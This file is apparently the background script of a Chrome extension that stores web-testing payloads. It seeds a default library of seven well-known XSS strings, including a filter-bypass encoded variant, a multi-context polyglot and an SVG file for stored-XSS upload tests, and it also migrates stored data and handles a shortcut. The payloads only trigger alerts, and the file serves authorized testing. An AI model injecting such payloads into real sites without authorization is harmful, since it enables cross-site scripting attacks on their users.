// Seeds the default payload library on first install, migrates old
// single-"category" data to the new "tags" array format on update, and
// handles the Alt+Shift+F quick-view shortcut.
//
// Well-known, publicly documented reference payloads (OWASP XSS Cheat Sheet /
// PortSwigger Web Security Academy) for authorized security testing use only.

const DEFAULT_PAYLOADS = [
  {
    id: "basic-script",
    tags: ["xss"],
    label: "Basic <script> alert",
    value: "<script>alert(1)</script>"
  },
  {
    id: "img-onerror",
    tags: ["xss"],
    label: "IMG onerror",
    value: "<img src=x onerror=alert(1)>"
  },
  {
    id: "svg-onload",
    tags: ["xss"],
    label: "SVG onload",
    value: "<svg onload=alert(1)>"
  },
  {
    id: "html-entity-encoded",
    tags: ["encoded", "xss"],
    label: "HTML entity-encoded onerror (filter bypass demo)",
    value: "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"
  },
  {
    id: "classic-polyglot",
    tags: ["polyglot", "xss"],
    label: "Classic multi-context polyglot",
    value: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
  },
  {
    id: "js-url",
    tags: ["url", "xss"],
    label: "javascript: URL",
    value: "javascript:alert(document.domain)"
  },
  {
    id: "svg-xml-file",
    tags: ["fileupload", "xss"],
    label: "SVG/XML file for stored-XSS upload testing",
    value: "<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\">\n  <circle cx=\"50\" cy=\"50\" r=\"40\" />\n</svg>"
  }
];

function buildFoldersFromPayloads(payloads) {
  const folders = {};
  let order = 0;
  for (const p of payloads) {
    for (const t of p.tags || []) {
      if (!folders[t]) {
        folders[t] = { order: order++, explicit: false, displayName: t };
      }
    }
  }
  return folders;
}

chrome.runtime.onInstalled.addListener(async (details) => {
  if (details.reason === "install") {
    const existing = await chrome.storage.local.get(["payloads", "folders", "settings"]);
    if (!existing.payloads) {
      await chrome.storage.local.set({
        payloads: DEFAULT_PAYLOADS.map((p, i) => ({ ...p, order: i, tagOrder: {} })),
        folders: buildFoldersFromPayloads(DEFAULT_PAYLOADS),
        recents: [],
        settings: { shortcutTarget: "recent" }
      });
    }
  }

  if (details.reason === "update") {
    const { payloads } = await chrome.storage.local.get("payloads");
    if (payloads && payloads.length) {
      let changed = false;
      const migrated = payloads.map((p, i) => {
        const np = { ...p };
        // Old data model used a single "category" string. Convert to tags[].
        if (!Array.isArray(np.tags)) {
          const cat = (np.category || "").trim();
          np.tags = cat ? [cat.toLowerCase()] : [];
          delete np.category;
          changed = true;
        }
        if (typeof np.order !== "number") {
          np.order = i;
          changed = true;
        }
        if (!np.tagOrder || typeof np.tagOrder !== "object") {
          np.tagOrder = {};
          changed = true;
        }
        return np;
      });
      if (changed) {
        const { folders } = await chrome.storage.local.get("folders");
        const mergedFolders = folders && Object.keys(folders).length
          ? folders
          : buildFoldersFromPayloads(migrated);
        await chrome.storage.local.set({ payloads: migrated, folders: mergedFolders });
      }
    }
    const { settings } = await chrome.storage.local.get("settings");
    if (!settings) {
      await chrome.storage.local.set({ settings: { shortcutTarget: "recent" } });
    }
    const { recents } = await chrome.storage.local.get("recents");
    if (!recents) {
      await chrome.storage.local.set({ recents: [] });
    }
  }
});

// Alt+Shift+F (configurable target key combo lives in chrome://extensions/shortcuts).
// We don't use "_execute_action" here because Chrome handles that command
// internally and never fires onCommand, so there's no way to tell the popup
// "you were opened via the shortcut, show the quick view". Using our own
// named command lets us set a flag first, then open the popup ourselves.
chrome.commands.onCommand.addListener(async (command) => {
  if (command !== "quick_view") return;
  try {
    const { settings } = await chrome.storage.local.get("settings");
    const target = (settings && settings.shortcutTarget) || "recent";
    await chrome.storage.local.set({ pendingView: { target, ts: Date.now() } });
    if (chrome.action.openPopup) {
      await chrome.action.openPopup();
    }
  } catch (err) {
    // openPopup() can be unavailable/restricted on some Chrome versions —
    // the pendingView flag is still set, so if the user opens the popup by
    // hand right after, it will still land on the right view.
  }
});
